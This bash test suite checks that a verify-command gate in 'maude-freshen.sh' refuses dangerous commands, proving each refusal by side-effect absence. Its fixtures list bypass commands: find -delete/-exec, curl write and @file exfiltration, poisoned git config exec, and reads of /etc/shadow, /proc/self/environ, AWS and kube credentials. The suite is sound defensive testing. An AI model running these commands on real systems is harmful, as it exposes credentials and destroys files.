#!/usr/bin/env bash
# Tests for scripts/maude-freshen.sh — verify lines on live-state claims.
#
# Teeth are proven BOTH directions (a planted STALE goes loud; a clean fixture
# stays silent) and the refusal gate is proven by side-effect absence: a
# forbidden command that would create a file is planted, freshen runs, and the
# file must NOT exist — a refusal you never watched refuse is not a gate.

set +e
. "$(dirname "$0")/lib.sh"

FRESHEN="$SCRIPTS_DIR/maude-freshen.sh"

setup_test_env
MEMDIR="$TEST_TMP/memory"
mkdir -p "$MEMDIR"
# Claims count STATIC, never MEMDIR: the first run of this suite proved why —
# a fixture claim counting MEMDIR went stale the moment a later test added a
# now_*.md beside it. A fixture whose truth depends on its siblings is the
# fixture-failure class this whole mechanism exists to catch.
STATIC="$TEST_TMP/static"
mkdir -p "$STATIC"
: > "$STATIC/one-file"

run_freshen() { # args…; fixture memdir via env
  MAUDE_FRESHEN_MEMDIR="$MEMDIR" bash "$FRESHEN" "$@" 2>&1
}

# ── Direction B: a clean fixture stays silent (no STALE, exit 0) ─────
cat > "$MEMDIR/now_clean.md" <<EOF
# Now — clean
- ✅ tests dir exists · verify: \`ls -d $STATIC\` ⇒ \`$STATIC\`
- ✅ pipe works · verify: \`ls $STATIC | wc -l\` ⇒ \`1\`
EOF

OUT="$(run_freshen)"
RC=$?
test_start "clean fixture exits 0"
assert_exit "$RC" "0" "exit"
test_start "clean fixture: both claims CONFIRMED"
assert_contains "$OUT" "2 confirmed" "confirmed count"
test_start "clean fixture emits no STALE line"
case "$OUT" in *"STALE"*) assert_exit "1" "0" "unexpected STALE";; *) assert_exit "0" "0" "silent";; esac

# ── Direction A: a planted stale claim goes LOUD (exit 1) ────────────
cat > "$MEMDIR/now_stale.md" <<EOF
- 🔴 planted stale · verify: \`ls $STATIC | wc -l\` ⇒ \`999\`
EOF

OUT="$(run_freshen)"
RC=$?
test_start "planted stale exits 1"
assert_exit "$RC" "1" "exit"
test_start "planted stale is named STALE with expected vs got"
assert_contains "$OUT" "STALE" "verdict"
test_start "stale line shows the expectation"
assert_contains "$OUT" "expected \`999\`" "expected shown"
rm -f "$MEMDIR/now_stale.md"

# ── Refusal gate: forbidden command NEVER executes (side-effect proof)
SIDE="$TEST_TMP/side-effect-file"
cat > "$MEMDIR/now_forbidden.md" <<EOF
- 🔴 forbidden verb · verify: \`touch $SIDE\` ⇒ \`\`
- 🔴 forbidden operator · verify: \`ls $TEST_TMP; touch $SIDE\` ⇒ \`\`
- 🔴 forbidden pipe segment · verify: \`ls $TEST_TMP | touch $SIDE\` ⇒ \`\`
- 🔴 git write verb · verify: \`git -C $TEST_TMP push origin main\` ⇒ \`\`
EOF

OUT="$(run_freshen)"
RC=$?
test_start "forbidden commands report UNVERIFIABLE"
assert_contains "$OUT" "4 unverifiable" "all four denied"
test_start "forbidden commands do NOT flip exit to 1"
assert_exit "$RC" "0" "unverifiable is a memory, not a failure"
test_start "REFUSAL PROVEN: side-effect file does not exist"
[ ! -e "$SIDE" ]
assert_exit "$?" "0" "no side effect"
test_start "git write verb named in the denial"
assert_contains "$OUT" "git verb 'push'" "verb-level denial"
rm -f "$MEMDIR/now_forbidden.md"

# ── The adversarial-lens battery (2026-08-22): every proven bypass, dead ──
# An adversarial reviewer achieved ACE, arbitrary file-write, and deletion
# through the first classifier. Each line below is one of those proven
# exploits; the shared PWNED file is the side-effect witness — after the run
# it must NOT exist. A refusal you never watched refuse is not a gate.
PWNED="$TEST_TMP/PWNED"
TABX=$'\t'   # real tab — the lens walked one through the space-anchored deny
# Quote/brace-free by design — those characters are banned globally (tested
# separately in the desync battery); here each line proves its per-TOOL deny.
cat > "$MEMDIR/now_lens.md" <<EOF
- 🔴 find head dropped · verify: \`find $TEST_TMP -maxdepth 0 -delete\` ⇒ \`x\`
- 🔴 sqlite3 head dropped · verify: \`sqlite3 -readonly $TEST_TMP/x.db .tables\` ⇒ \`x\`
- 🔴 tab -delete bypass · verify: \`find $TEST_TMP${TABX}-name${TABX}victim${TABX}-delete\` ⇒ \`x\`
- 🔴 tab -exec bypass · verify: \`find $TEST_TMP${TABX}-exec${TABX}touch${TABX}$PWNED\` ⇒ \`x\`
- 🔴 find -fprint write · verify: \`find $TEST_TMP -maxdepth 1 -fprint $PWNED\` ⇒ \`x\`
- 🔴 git diff --output write · verify: \`git -C $TEST_TMP diff --output=$PWNED\` ⇒ \`x\`
- 🔴 git branch ref-write · verify: \`git -C $TEST_TMP branch pwned-branch\` ⇒ \`x\`
- 🔴 curl --trace write · verify: \`curl -s --trace $PWNED https://example.invalid/x\` ⇒ \`x\`
- 🔴 curl --libcurl write · verify: \`curl -s --libcurl $PWNED https://example.invalid/x\` ⇒ \`x\`
- 🔴 git -c config exec · verify: \`git -c core.fsmonitor=danger status\` ⇒ \`x\`
- 🔴 curl attached -XPOST · verify: \`curl -sXPOST https://example.invalid/x\` ⇒ \`x\`
EOF
OUT="$(run_freshen)"
RC=$?
test_start "LENS BATTERY: every exploit line is UNVERIFIABLE (none executed)"
assert_contains "$OUT" "11 unverifiable" "all eleven denied"
test_start "LENS BATTERY: exit is 0 (unverifiable is a memory, not a failure)"
assert_exit "$RC" "0" "exit"
test_start "REFUSAL PROVEN: no exploit created the PWNED file"
[ ! -e "$PWNED" ]
assert_exit "$?" "0" "no ACE / no write"
test_start "sqlite3 dropped from the allowlist entirely"
assert_contains "$OUT" "command 'sqlite3' not allowlisted" "sqlite3 gone"
test_start "find dropped from the allowlist entirely"
assert_contains "$OUT" "command 'find' not allowlisted" "find gone"
test_start "git --output write flag denied"
assert_contains "$OUT" "git write flag (--output)" "git output denied"
test_start "git branch (ref-write verb) denied"
assert_contains "$OUT" "git verb 'branch' not read-allowlisted" "branch denied"
test_start "curl --libcurl (write flag) denied by deny-by-default allowlist"
assert_contains "$OUT" "curl flag '--libcurl' not allowlisted" "libcurl denied"
rm -f "$MEMDIR/now_lens.md"

# ── Round-2 lens: quote/brace desync (classifier sees one string, bash runs
# another). Every one of these must be UNVERIFIABLE, and the two exfil shapes
# must never land a secret in the report. Plant a decoy secret + a write-witness.
SECRETF="$STATIC/data.env"; printf 'SECRET123\n' > "$SECRETF"
GWRITE="$TEST_TMP/OUT_git_q"
export FRESHEN_LEAK_MARKER="TOP_SECRET_abc123"
cat > "$MEMDIR/now_desync.md" <<EOF
- 🔴 brace-expand secret (E) · verify: \`cat $STATIC/data.e{n..n}v\` ⇒ \`SECRET123\`
- 🔴 quote-strip secret · verify: \`cat $STATIC/data.e"n"v\` ⇒ \`SECRET123\`
- 🔴 git --output quote-desync · verify: \`git -C $TEST_TMP diff --"output"=$GWRITE\` ⇒ \`x\`
- 🔴 jq env quote-desync · verify: \`cat $STATIC/one-file | jq -R "e"nv.FRESHEN_LEAK_MARKER\` ⇒ \`x\`
EOF
OUT="$(run_freshen)"
unset FRESHEN_LEAK_MARKER
test_start "quote/brace desync: all four UNVERIFIABLE (banned characters)"
assert_contains "$OUT" "4 unverifiable" "all denied"
test_start "brace/quote chars named in the denial"
assert_contains "$OUT" "forbidden brace" "brace denied"
test_start "EXFIL PROVEN DEAD: SECRET123 never reached the report"
case "$OUT" in *"SECRET123"*) FAILED=$((FAILED+1)); printf '  FAIL secret leaked via desync\n';; *) assert_exit "0" "0" "no secret";; esac
test_start "EXFIL PROVEN DEAD: env marker never reached the report"
case "$OUT" in *"TOP_SECRET_abc123"*) FAILED=$((FAILED+1)); printf '  FAIL env leaked via desync\n';; *) assert_exit "0" "0" "no env";; esac
test_start "WRITE PROVEN DEAD: git --output quote-desync wrote nothing"
[ ! -e "$GWRITE" ]
assert_exit "$?" "0" "no git write"
rm -f "$MEMDIR/now_desync.md" "$SECRETF"

# Round-3 lens: `file -C` (--compile) writes magic.mgc to CWD — a reader with
# a write flag. `file` is dropped; prove the head is denied and nothing writes.
# Run from a scratch CWD so a stray magic.mgc would be visible and harmless.
MGC_CWD="$TEST_TMP/mgccwd"; mkdir -p "$MGC_CWD"
cat > "$MEMDIR/now_filec.md" <<EOF
- 🔴 file -C write · verify: \`file -C\` ⇒ \`x\`
- 🔴 file -C -m named · verify: \`file -C -m pwned\` ⇒ \`x\`
EOF
OUT="$( cd "$MGC_CWD" && run_freshen )"
test_start "file (has -C write flag) dropped from the reader allowlist"
assert_contains "$OUT" "command 'file' not allowlisted" "file gone"
test_start "REFUSAL PROVEN: file -C wrote no magic.mgc"
[ -z "$(find "$MGC_CWD" -name '*.mgc' 2>/dev/null)" ]
assert_exit "$?" "0" "no .mgc written"
rm -f "$MEMDIR/now_filec.md"; rm -rf "$MGC_CWD"

# Round-3 caveat: < ( ) are bash word-separators the tokenizer missed. Banned.
cat > "$MEMDIR/now_redir.md" <<EOF
- 🔴 stdin redirect · verify: \`cat < $STATIC/one-file\` ⇒ \`x\`
- 🔴 subshell open · verify: \`ls $TEST_TMP\` ⇒ \`x\`
EOF
# (second line is a control that MUST still pass; only the redirect is denied)
printf -- '- 🔴 subshell · verify: `cat %s/one-file | ( cat )` ⇒ `x`\n' "$STATIC" >> "$MEMDIR/now_redir.md"
OUT="$(run_freshen)"
test_start "stdin redirect < denied (word-separator ban)"
assert_contains "$OUT" "forbidden redirect/word-separator <" "redirect denied"
test_start "subshell ( ) denied"
assert_contains "$OUT" "forbidden subshell" "subshell denied"
rm -f "$MEMDIR/now_redir.md"

# Round-4 lens: git on-disk config-as-code (core.fsmonitor/diff.external run a
# command on status/show). The verb is allowlisted, so the classifier lets it
# run — the exec-config neuter at the sink must make it inert.
GPWN="$TEST_TMP/GIT_CONFIG_PWNED"
POISON="$TEST_TMP/poison-repo"
( git init -q "$POISON" \
  && git -C "$POISON" config diff.external "touch $GPWN" \
  && git -C "$POISON" config core.fsmonitor "touch $GPWN" \
  && git -C "$POISON" -c user.email=t@t -c user.name=t commit -q --allow-empty -m x ) 2>/dev/null
# The setup git ops themselves (run WITHOUT the neuter) may already have fired
# the poison — clear the sentinel so its presence AFTER freshen is freshen's.
rm -f "$GPWN"
cat > "$MEMDIR/now_gitpoison.md" <<EOF
- 🔴 fsmonitor exec · verify: \`git -C $POISON status\` ⇒ \`x\`
- 🔴 diff.external exec · verify: \`git -C $POISON show\` ⇒ \`x\`
EOF
run_freshen >/dev/null
test_start "REFUSAL PROVEN: poisoned git on-disk config did NOT execute"
[ ! -e "$GPWN" ]
assert_exit "$?" "0" "git config exec neutered"
rm -f "$MEMDIR/now_gitpoison.md"; rm -rf "$POISON"

# Round-4 lens: widened secret-deny covers the cloud/cred stores + /proc.
cat > "$MEMDIR/now_widesecret.md" <<EOF
- 🔴 shadow · verify: \`cat /etc/shadow\` ⇒ \`x\`
- 🔴 proc environ · verify: \`cat /proc/self/environ\` ⇒ \`x\`
- 🔴 aws creds · verify: \`cat /srv/x/.aws/credentials\` ⇒ \`x\`
- 🔴 kube · verify: \`cat /srv/x/.kube/config\` ⇒ \`x\`
EOF
OUT="$(run_freshen)"
test_start "widened secret-deny: shadow/proc/aws/kube all refused"
assert_contains "$OUT" "4 unverifiable" "all four denied"
rm -f "$MEMDIR/now_widesecret.md"

# curl @file exfil (finding: -H @localfile reads a file into the request).
cat > "$MEMDIR/now_curlat.md" <<EOF
- 🔴 curl @ header-file · verify: \`curl -s https://example.invalid/x -H @$STATIC/one-file\` ⇒ \`y\`
EOF
OUT="$(run_freshen)"
test_start "curl @ (file-read into request) denied"
assert_contains "$OUT" "curl @ (file-read into request)" "at denied"
rm -f "$MEMDIR/now_curlat.md"

# Reader write-surfaces: sort -o and uniq's 2nd positional both write a file.
# They are NOT allowlisted; prove neither runs.
RWRITE="$TEST_TMP/reader-wrote"
cat > "$MEMDIR/now_readerwrite.md" <<EOF
- 🔴 sort -o write · verify: \`sort -o $RWRITE $STATIC/one-file\` ⇒ \`x\`
- 🔴 uniq outfile write · verify: \`uniq $STATIC/one-file $RWRITE\` ⇒ \`x\`
EOF
OUT="$(run_freshen)"
test_start "sort (has -o write flag) not allowlisted"
assert_contains "$OUT" "command 'sort' not allowlisted" "sort gone"
test_start "uniq (2nd positional is an output file) not allowlisted"
assert_contains "$OUT" "command 'uniq' not allowlisted" "uniq gone"
test_start "REFUSAL PROVEN: no reader wrote a file"
[ ! -e "$RWRITE" ]
assert_exit "$?" "0" "no reader write"
rm -f "$MEMDIR/now_readerwrite.md"

# The tab-delete could only delete something real; prove it did NOT.
VICTIM="$TEST_TMP/victim"; : > "$VICTIM"
cat > "$MEMDIR/now_tabdel.md" <<EOF
- 🔴 tab delete · verify: \`find $TEST_TMP${TABX}-name${TABX}victim${TABX}-delete\` ⇒ \`x\`
EOF
run_freshen >/dev/null
test_start "REFUSAL PROVEN: tab -delete did NOT delete the victim file"
[ -e "$VICTIM" ]
assert_exit "$?" "0" "victim survived"
rm -f "$MEMDIR/now_tabdel.md" "$VICTIM"

# Glob-into-secret exfiltration (finding 9): a glob that dodges the substring
# secret-deny must not resolve into a real file at exec time. Plant a decoy
# secret and prove its contents never reach the report.
mkdir -p "$TEST_TMP/creds"; printf 'TOPSECRET-XYZ\n' > "$TEST_TMP/creds/leak"
cat > "$MEMDIR/now_glob.md" <<EOF
- 🔴 glob into secret · verify: \`cat $TEST_TMP/cr?ds/leak\` ⇒ \`nomatch\`
EOF
OUT="$(run_freshen)"
test_start "glob does not expand at exec (noglob) — secret never read"
case "$OUT" in *"TOPSECRET-XYZ"*) FAILED=$((FAILED+1)); printf '  FAIL glob leaked secret\n';; *) assert_exit "0" "0" "no leak";; esac
test_start "glob probe is CHECK-FAILED (literal path absent), not a silent pass"
assert_contains "$OUT" "CHECK-FAILED" "honest failure"
rm -f "$MEMDIR/now_glob.md"

# jq env-dump exfiltration (finding 10): jq's env builtin must be refused.
export FAKE_SESSION_SECRET="leak-me-42"
cat > "$MEMDIR/now_jqenv.md" <<EOF
- 🔴 jq env dump · verify: \`jq -n env\` ⇒ \`x\`
- 🔴 jq -n null-input · verify: \`jq -n '1+1'\` ⇒ \`2\`
EOF
OUT="$(run_freshen)"
unset FAKE_SESSION_SECRET
test_start "jq env-dump refused (flag or filter), secret never printed"
case "$OUT" in *"leak-me-42"*) FAILED=$((FAILED+1)); printf '  FAIL jq leaked env\n';; *) assert_exit "0" "0" "no env leak";; esac
test_start "jq -n (null-input) denied"
assert_contains "$OUT" "jq flag '-n'" "null-input denied"
rm -f "$MEMDIR/now_jqenv.md"

# The real seed shapes must SURVIVE the hardening (direction B for the grammar).
cat > "$MEMDIR/now_realshapes.md" <<EOF
- ✅ git ahead-count · verify: \`git -C $TEST_TMP rev-list HEAD..HEAD --count\` ⇒ \`0\`
- ✅ jq file projection · verify: \`jq -r .a.b $STATIC/doc.json\` ⇒ \`ok\`
EOF
( cd "$TEST_TMP" && git init -q && git -c user.email=t@t -c user.name=t commit -q --allow-empty -m init 2>/dev/null )
printf '{"a":{"b":"ok"}}\n' > "$STATIC/doc.json"
OUT="$(run_freshen realshapes)"
test_start "real git rev-list shape still CONFIRMS through the hardened gate"
assert_contains "$OUT" "CONFIRMED     now_realshapes.md:1" "git rev-list survives"
test_start "real jq file-projection shape still CONFIRMS"
assert_contains "$OUT" "CONFIRMED     now_realshapes.md:2" "jq projection survives"
rm -f "$MEMDIR/now_realshapes.md" "$STATIC/doc.json"; rm -rf "$TEST_TMP/.git"

# ── Secret-shaped targets: denied unexecuted ─────────────────────────
cat > "$MEMDIR/now_secret.md" <<EOF
- 🔴 secret probe · verify: \`cat /srv/x/.credentials/secrets.yaml\` ⇒ \`x\`
EOF
OUT="$(run_freshen)"
test_start "secret-shaped target denied"
assert_contains "$OUT" "secret-shaped target" "deny reason"
rm -f "$MEMDIR/now_secret.md"

# ── Malformed: missing ⇒ expectation ─────────────────────────────────
cat > "$MEMDIR/now_malformed.md" <<EOF
- 🔴 no expectation · verify: \`ls $TEST_TMP\`
EOF
OUT="$(run_freshen)"
test_start "missing expectation reports UNVERIFIABLE"
assert_contains "$OUT" "the expectation is mandatory" "malformed named"
rm -f "$MEMDIR/now_malformed.md"

# ── CHECK-FAILED: probe breakage is loud and distinct ────────────────
cat > "$MEMDIR/now_broken.md" <<EOF
- 🔴 probe errors · verify: \`ls $TEST_TMP/does-not-exist-xyz\` ⇒ \`0\`
EOF
OUT="$(run_freshen)"
RC=$?
test_start "broken probe exits 1"
assert_exit "$RC" "1" "exit"
test_start "broken probe is CHECK-FAILED, not STALE"
assert_contains "$OUT" "CHECK-FAILED" "verdict"
case "$OUT" in *"STALE"*) FAILED=$((FAILED+1)); printf '  FAIL folded into STALE\n';; esac
rm -f "$MEMDIR/now_broken.md"

# ── Timeout path: a hanging read-only command is CHECK-FAILED ────────
cat > "$MEMDIR/now_hang.md" <<EOF
- 🔴 hangs forever · verify: \`tail -f /dev/null\` ⇒ \`\`
EOF
OUT="$(MAUDE_FRESHEN_TIMEOUT=1 run_freshen)"
test_start "hanging command reports timeout as CHECK-FAILED"
assert_contains "$OUT" "timed out after 1s" "timeout named"
rm -f "$MEMDIR/now_hang.md"

# ── Wake mode: NET lines skipped, LOCAL still runs ───────────────────
cat > "$MEMDIR/now_mixed.md" <<EOF
- 🔴 local claim · verify: \`ls -d $STATIC\` ⇒ \`$STATIC\`
- 🔴 net claim · verify: \`curl -s https://example.invalid/x\` ⇒ \`y\`
EOF
OUT="$(run_freshen --wake)"
RC=$?
test_start "wake skips the network claim"
assert_contains "$OUT" "WAKE-SKIPPED" "skip verdict"
test_start "wake still confirms the local claim"
assert_contains "$OUT" "CONFIRMED     now_mixed.md:1" "local ran"
test_start "wake exits 0 when local claims are clean"
assert_exit "$RC" "0" "exit"
rm -f "$MEMDIR/now_mixed.md"

# ── Full mode classifies curl as runnable (deny only write flags) ────
cat > "$MEMDIR/now_curlwrite.md" <<EOF
- 🔴 curl upload · verify: \`curl -s -X POST https://example.invalid/x\` ⇒ \`y\`
- 🔴 curl to file · verify: \`curl -s -o $SIDE https://example.invalid/x\` ⇒ \`y\`
EOF
OUT="$(run_freshen)"
test_start "curl write flags denied"
assert_contains "$OUT" "2 unverifiable" "both denied"
test_start "curl -o refusal proven by side-effect absence"
[ ! -e "$SIDE" ]
assert_exit "$?" "0" "no download file"
rm -f "$MEMDIR/now_curlwrite.md"

# ── Unannotated open markers counted as memories, not readings ───────
cat > "$MEMDIR/now_markers.md" <<EOF
- 🔴 open item with no verify line at all
- ⚠️ another bare open marker
EOF
OUT="$(run_freshen)"
test_start "bare open markers counted in the summary"
assert_contains "$OUT" "2 open-marker lines carry no verify line" "memories counted"
rm -f "$MEMDIR/now_markers.md"

# ── Project narrowing ────────────────────────────────────────────────
cat > "$MEMDIR/now_other.md" <<EOF
- 🔴 planted stale in OTHER · verify: \`ls $STATIC | wc -l\` ⇒ \`888\`
EOF
OUT="$(run_freshen clean)"
RC=$?
test_start "project arg narrows scope (other file's stale not seen)"
assert_exit "$RC" "0" "clean project exits 0"
case "$OUT" in *"888"*) FAILED=$((FAILED+1)); printf '  FAIL leaked other project\n';; esac
rm -f "$MEMDIR/now_other.md"

# ── Trace receipt: one metadata-only freshen event per run ───────────
if command -v jq >/dev/null 2>&1; then
  TRACE_DIR="$TEST_TMP/.maude/plugin/trace"
  OUT="$(run_freshen)"
  test_start "run appends a kind=freshen trace event with counts only"
  TLINE="$(cat "$TRACE_DIR"/today-*.jsonl 2>/dev/null | jq -r 'select(.kind=="freshen") | .payload' | tail -1)"
  assert_contains "$TLINE" "confirmed=" "counts present"
  case "$TLINE" in *'verify:'*|*"$TEST_TMP"*) FAILED=$((FAILED+1)); printf '  FAIL trace leaked claim content\n';; esac
fi

teardown_test_env
print_summary
exit $FAILED
